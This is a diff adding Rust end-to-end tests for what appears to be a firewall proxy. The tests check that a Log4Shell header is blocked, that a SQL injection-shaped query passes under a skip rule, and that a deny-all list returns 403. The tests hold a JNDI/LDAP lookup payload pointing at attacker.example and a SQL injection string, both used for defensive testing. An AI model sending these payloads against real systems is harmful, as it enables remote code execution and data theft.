@@ -405,3 +405,47 @@ async fn upload_over_client_max_body_size_gets_413() -> TestResult {
     assert_eq!(reply.status, StatusCode::PAYLOAD_TOO_LARGE);
     Ok(())
 }
+
+#[tokio::test]
+#[ignore = "needs the e2e compose stack; run scripts/e2e.sh"]
+async fn built_in_rule_blocks_a_log4shell_header_before_a_slow_model_answer() -> TestResult {
+    // The stub answers /slow after the 300 ms timeout, and a timeout allows by default.
+    // The 403 shows that the built-in rule decided without waiting for the backend.
+    let reply = send(
+        &base(),
+        Method::GET,
+        "/slow",
+        "enforce.test",
+        &[("x-probe", "${jndi:ldap://attacker.example/a}")],
+        Bytes::new(),
+    )
+    .await?;
+    assert_eq!(reply.status, StatusCode::FORBIDDEN);
+    Ok(())
+}
+
+#[tokio::test]
+#[ignore = "needs the e2e compose stack; run scripts/e2e.sh"]
+async fn user_skip_rule_forwards_an_attack_shaped_query_without_the_model() -> TestResult {
+    // Without the skip rule the stub would block this query, as the SQL injection test shows.
+    let reply = send(
+        &base(),
+        Method::GET,
+        "/catalog?id=%27%20or%201%3D1",
+        "enforce.test",
+        &[],
+        Bytes::new(),
+    )
+    .await?;
+    assert_eq!(reply.status, StatusCode::OK);
+    assert!(reply.text().contains("upstream ok"));
+    Ok(())
+}
+
+#[tokio::test]
+#[ignore = "needs the e2e compose stack; run scripts/e2e.sh"]
+async fn access_list_deny_all_gets_403() -> TestResult {
+    let reply = send(&base(), Method::GET, "/", "access.test", &[], Bytes::new()).await?;
+    assert_eq!(reply.status, StatusCode::FORBIDDEN);
+    Ok(())
+}
